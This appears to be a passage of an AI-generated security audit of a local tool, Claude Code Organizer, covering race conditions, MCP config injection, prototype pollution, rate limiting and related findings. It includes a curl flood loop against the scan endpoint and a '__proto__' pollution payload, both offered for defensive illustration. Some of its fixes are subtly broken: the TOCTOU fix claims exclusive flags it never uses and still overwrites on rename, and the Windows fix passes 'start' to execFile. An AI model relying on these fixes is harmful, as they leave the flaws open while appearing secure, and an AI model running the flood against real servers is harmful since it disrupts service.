### VULN-012: Race Conditions in File Operations (Check-Then-Act)

| Field | Value |
|-------|-------|
| **OWASP** | A04 Insecure Design (CWE-367: Time-of-Check Time-of-Use) |
| **File** | `src/mover.mjs`, lines 114, 139, 160, 184, 209, 233 |
| **CVSS Score** | 4.5 / 10.0 |

#### What's happening

Every move function follows the same pattern — check if the destination exists, then perform the move:

```javascript
// src/mover.mjs, line 114 (and similar at 139, 160, 184, 209, 233)
if (existsSync(toPath)) {
  return { ok: false, error: `File already exists at destination` };
}
// Time passes between check and action ← THE VULNERABILITY
await mkdir(toDir, { recursive: true });
await safeRename(item.path, toPath);
```

#### What is a TOCTOU race condition?

**TOCTOU** stands for **Time-of-Check, Time-of-Use**. Between the moment you check "does this file exist?" and the moment you actually move the file, another process could create a file at that path. Your code would then overwrite it, potentially causing data loss.

Additionally, `existsSync` is **synchronous** — it blocks the entire Node.js event loop while checking the filesystem. In an async function (which everything else here is), this blocks all other requests from being processed.

#### Suggested fix

Instead of checking first, attempt the operation and handle the error:

```javascript
try {
  // Use exclusive flags — fails if destination already exists
  await mkdir(toDir, { recursive: true });
  await rename(item.path, toPath);
} catch (err) {
  if (err.code === 'EEXIST') {
    return { ok: false, error: `File already exists at destination` };
  }
  throw err;
}
```

---

### VULN-013: Unrestricted MCP Config Injection via `/api/restore-mcp`

| Field | Value |
|-------|-------|
| **OWASP** | A01 Broken Access Control |
| **File** | `src/server.mjs`, lines 447–462 |
| **CVSS Score** | 5.0 / 10.0 |

#### What's happening

The `/api/restore-mcp` endpoint restores a deleted MCP server entry. It accepts a `mcpJsonPath` from the request body and writes MCP configuration to that file:

```javascript
// src/server.mjs, lines 447-462
const { name, config, mcpJsonPath } = await readBody(req);
if (!name || !config || !mcpJsonPath || !isPathAllowed(mcpJsonPath)) {
  return json(res, { ok: false, error: "..." }, 400);
}
// ...
content.mcpServers[name] = config;
await wf(mcpJsonPath, JSON.stringify(content, null, 2) + "\n");
```

Since `isPathAllowed` accepts any path under HOME, an attacker could write `.mcp.json` files to any project directory, injecting a malicious MCP server that Claude Code would then load and execute.

#### Suggested fix

Only allow writes to known `.mcp.json` locations:

```javascript
const allowedMcpPaths = new Set([
  join(CLAUDE_DIR, '.mcp.json'),
  ...cachedData?.scopes.filter(s => s.repoDir).map(s => join(s.repoDir, '.mcp.json')) || []
]);
if (!allowedMcpPaths.has(resolve(mcpJsonPath))) {
  return json(res, { ok: false, error: "Invalid MCP config path" }, 400);
}
```

---

### VULN-014: Google Fonts Tracking

| Field | Value |
|-------|-------|
| **OWASP** | A05 Security Misconfiguration |
| **File** | `src/ui/index.html`, line 8 |
| **CVSS Score** | 3.0 / 10.0 |

#### What's happening

```html
<!-- src/ui/index.html, line 8 -->
<link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700;900&family=Geist+Mono:wght@400;500&display=swap" rel="stylesheet">
```

Every time the dashboard loads, your browser makes a request to Google's servers, sending your IP address, browser fingerprint, and the fact that you're using Claude Code Organizer. For a local developer tool that handles sensitive configuration, this is a privacy concern.

#### Suggested fix

Self-host the fonts, or use system fonts:

```css
font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
font-family: ui-monospace, "Cascadia Code", "Fira Code", monospace;
```

---

## Low Severity

### VULN-015: Shell Command Pattern in Browser Launch

| Field | Value |
|-------|-------|
| **OWASP** | A03 Injection (CWE-78: OS Command Injection) |
| **File** | `bin/cli.mjs`, lines 109–113 |
| **CVSS Score** | 3.0 / 10.0 |

#### What's happening

The CLI uses `execSync` with string interpolation to open the browser:

```javascript
// bin/cli.mjs, lines 109-113
const openCmd = process.platform === 'darwin' ? 'open' : 'xdg-open';
execSync(`${openCmd} http://localhost:${port}`, { stdio: 'ignore' });
```

The `port` variable comes from `parseInt(args[portIdx + 1], 10)`, which converts to a number (or `NaN`). So currently this is **not exploitable** because an integer can't contain shell metacharacters.

However, the pattern of using `execSync` with string interpolation is fragile. If someone refactors this code later and adds a string variable (like a custom URL), it could become injectable.

Also note: **Windows is not handled** — neither `open` (macOS) nor `xdg-open` (Linux) work on Windows. The Windows command would be `start`. The `catch` block silently swallows this, so it's not a crash, but the "auto-open browser" feature doesn't work on Windows.

#### Suggested fix

Use `execFile` (which takes an array of arguments instead of a shell string) and handle Windows:

```javascript
import { execFile } from 'node:child_process';

const commands = { darwin: 'open', win32: 'start', default: 'xdg-open' };
const openCmd = commands[process.platform] || commands.default;
execFile(openCmd, [`http://localhost:${port}`], { stdio: 'ignore' }, () => {});
```

---

### VULN-016: Prototype Pollution Risk from Parsed Config Files

| Field | Value |
|-------|-------|
| **OWASP** | A08 Software and Data Integrity Failures (CWE-1321) |
| **Files** | `src/scanner.mjs` (lines 482, 538), `src/mover.mjs` (lines 260, 273) |
| **CVSS Score** | 3.5 / 10.0 |

#### What is prototype pollution?

In JavaScript, every object inherits properties from `Object.prototype`. **Prototype pollution** is when an attacker injects a property named `__proto__` or `constructor` into a JSON object, which can then modify the prototype of all objects in the application.

#### What's happening

The app parses `.mcp.json` files from project directories using `JSON.parse()`. A malicious `.mcp.json` in a cloned repository could contain:

```json
{
  "mcpServers": {
    "__proto__": {
      "isAdmin": true
    }
  }
}
```

While `JSON.parse` itself doesn't directly pollute prototypes, the parsed data is spread into new objects and iterated with `Object.entries()`, which could propagate the pollution.

#### Suggested fix

Filter dangerous keys when iterating config files:

```javascript
const DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype']);
const safeEntries = Object.entries(config.mcpServers)
  .filter(([key]) => !DANGEROUS_KEYS.has(key));
```

---

### VULN-017: No Rate Limiting on Filesystem-Heavy Endpoints

| Field | Value |
|-------|-------|
| **OWASP** | A05 Security Misconfiguration (CWE-770) |
| **File** | `src/server.mjs`, all routes |
| **CVSS Score** | 3.0 / 10.0 |

#### What's happening

The `/api/scan` endpoint performs a full recursive filesystem scan every time it's called. There is no cooldown or rate limiting. An attacker could flood this endpoint to saturate disk I/O:

```bash
# Flood the scan endpoint:
while true; do curl http://localhost:3847/api/scan &; done
```

#### Suggested fix

Add a simple cooldown for scan operations:

```javascript
let lastScanTime = 0;
const SCAN_COOLDOWN_MS = 2000;

async function freshScan() {
  const now = Date.now();
  if (cachedData && now - lastScanTime < SCAN_COOLDOWN_MS) return cachedData;
  cachedData = await scan();
  lastScanTime = now;
  return cachedData;
}
```

---

### VULN-018: Frontend Doesn't Check HTTP Status Codes

| Field | Value |
|-------|-------|
| **OWASP** | A04 Insecure Design |
| **File** | `src/ui/app.js`, line 124 (approximately) |
| **CVSS Score** | 2.0 / 10.0 |

#### What's happening

The `fetchJson()` helper in the frontend parses the response as JSON without checking if the HTTP request actually succeeded:

```javascript
// src/ui/app.js (fetchJson function)
async function fetchJson(url) {
  const res = await fetch(url);
  return res.json();  // ← doesn't check res.ok first
}
```

If the server returns a 500 error with a JSON body, the frontend treats it as a successful response. This could cause confusing behavior — the UI might silently show stale data or fail to display error messages.

#### Suggested fix

```javascript
async function fetchJson(url) {
  const res = await fetch(url);
  if (!res.ok) throw new Error(`HTTP ${res.status}: ${res.statusText}`);
  return res.json();
}
```

---

## Informational Findings

These are not exploitable vulnerabilities but represent areas where the application deviates from security best practices.

### INFO-001: No HTTPS/TLS Support

The server only runs over plaintext HTTP. All data (including file contents and API keys from MCP configs) travels unencrypted. This is acceptable for `localhost`-only use, but if VULN-001 isn't fixed, data travels in plaintext over the network.

### INFO-002: No Audit Logging

No operations (file reads, moves, deletes, restores) are logged with timestamps. If unauthorized access occurs, there is no forensic trail to investigate what was accessed or modified.

### INFO-003: Session Files May Contain Sensitive Data

The `/api/session-preview` endpoint reads and returns Claude Code conversation transcripts. These may contain sensitive information discussed during sessions (credentials, proprietary code, business logic).

### INFO-004: Scan Cache Never Expires

The `cachedData` variable in `server.mjs` holds the full scan result in memory indefinitely. There is no cache expiration or size limit. On systems with many projects, this could consume significant memory.

### INFO-005: MCP Server Version Mismatch

`src/mcp-server.mjs` line 17 hardcodes `version: '0.5.0'` while `package.json` says `0.9.1`. This is cosmetic but confusing — tools querying the MCP server version get stale information.

### INFO-006: Duplicate Update Check

Both `bin/cli.mjs` and `src/server.mjs` perform independent update checks against the npm registry on startup, making two network requests instead of one.

---

## What The App Does Well

Security isn't all bad news. This audit also found several properly-implemented security measures:

1. **HTML Escaping**: The `esc()` function in `app.js` (line 2232) properly escapes `&`, `<`, `>`, and `"` characters and is used consistently in all `innerHTML` assignments. This prevents XSS (Cross-Site Scripting) through rendered data.

2. **Safe Preview Rendering**: File previews use `textContent` (not `innerHTML`), which is inherently safe against script injection.

3. **URL Parameter Encoding**: All frontend `fetch()` calls use `encodeURIComponent()` for path parameters, preventing URL injection.

4. **Locked Item Protection**: Items marked as `locked` are properly rejected by both move and delete operations, preventing accidental modification of core config files.

5. **Path Resolution Before Validation**: The `isPathAllowed()` function calls `path.resolve()` before checking prefixes, which normalizes `../` sequences and prevents simple directory traversal.

6. **MCP Server Input Validation**: The MCP server uses Zod schemas to validate input types, rejecting malformed requests before they reach business logic.

7. **No `eval()` or `Function()` Anywhere**: The codebase never uses dangerous JavaScript evaluation functions.

8. **Cross-Device Move Handling**: The `safeRename()` function in `mover.mjs` properly handles the `EXDEV` error (cross-device rename), falling back to copy-then-delete.

---

## Recommended Fix Order

### Immediate (before anyone else uses this tool)

| # | Finding | Effort | Impact |
|---|---------|--------|--------|
| 1 | VULN-001: Bind to 127.0.0.1 | 1 line | Eliminates remote access |
| 2 | VULN-004: Add Origin header validation | ~15 lines | Blocks CSRF attacks |
| 3 | VULN-003: Restrict path allowlist | ~15 lines | Prevents reading arbitrary files |
| 4 | VULN-002: Restrict restore writes to ~/.claude/ | ~3 lines | Prevents arbitrary file writes |

These 4 fixes (~34 lines of code) eliminate the most dangerous attack chain.

### Short-term (within a week)

| # | Finding | Effort | Impact |
|---|---------|--------|--------|
| 5 | VULN-005: Add body size limit | ~8 lines | Prevents DoS |
| 6 | VULN-006: Validate export path | ~3 lines | Prevents arbitrary directory writes |
| 7 | VULN-007: Sanitize error messages | ~5 lines | Stops info leakage |
| 8 | VULN-008: Redact MCP env vars | ~10 lines | Protects API keys |
| 9 | VULN-010: Add security headers | ~10 lines | Blocks clickjacking |
| 10 | VULN-009: Fix Windows paths | ~10 lines | Makes path validation work on Windows |

### When convenient

| # | Finding | Effort | Impact |
|---|---------|--------|--------|
| 11 | VULN-011: Add SRI to CDN script | 1 line | Supply chain protection |
| 12 | VULN-013: Validate restore-mcp path | ~10 lines | Prevents MCP injection |
| 13 | VULN-015: Use execFile for browser launch | ~5 lines | Safer pattern + Windows support |
| 14 | VULN-012: Fix TOCTOU race conditions | ~30 lines | Atomic file operations |
| 15 | VULN-017: Add scan rate limiting | ~8 lines | DoS mitigation |

---

## Glossary

| Term | Definition |
|------|-----------|
| **0.0.0.0** | A special address meaning "all network interfaces" — accepts connections from anywhere, not just your machine |
| **127.0.0.1** | The "loopback" address — only your own machine can connect |
| **CORS** | Cross-Origin Resource Sharing — browser rules about which websites can talk to which servers |
| **CSRF** | Cross-Site Request Forgery — tricking your browser into making unwanted requests |
| **CSP** | Content Security Policy — a header that tells browsers which scripts/resources are allowed to load |
| **CVSS** | Common Vulnerability Scoring System — a 0-10 scale for rating how dangerous a vulnerability is |
| **CWE** | Common Weakness Enumeration — a catalog of software weakness types |
| **DNS Hijacking** | Redirecting a domain name to a different IP address |
| **DoS** | Denial of Service — crashing or overloading a system so it can't serve legitimate users |
| **EXDEV** | A Unix/Windows error meaning "can't rename across different disk partitions" |
| **MCP** | Model Context Protocol — a standard for AI tools to communicate with external services |
| **OOM** | Out of Memory — when a program uses all available RAM and crashes |
| **OWASP** | Open Worldwide Application Security Project — a nonprofit that publishes security standards |
| **Path Traversal** | Using `../` or similar tricks to access files outside an intended directory |
| **SRI** | Subresource Integrity — a browser feature that verifies downloaded scripts haven't been tampered with |
| **TOCTOU** | Time-of-Check, Time-of-Use — a race condition where state changes between checking and acting |
| **XSS** | Cross-Site Scripting — injecting malicious scripts into a webpage |

---

*Report generated by Claude AI security audit. All findings should be independently verified before implementation.*
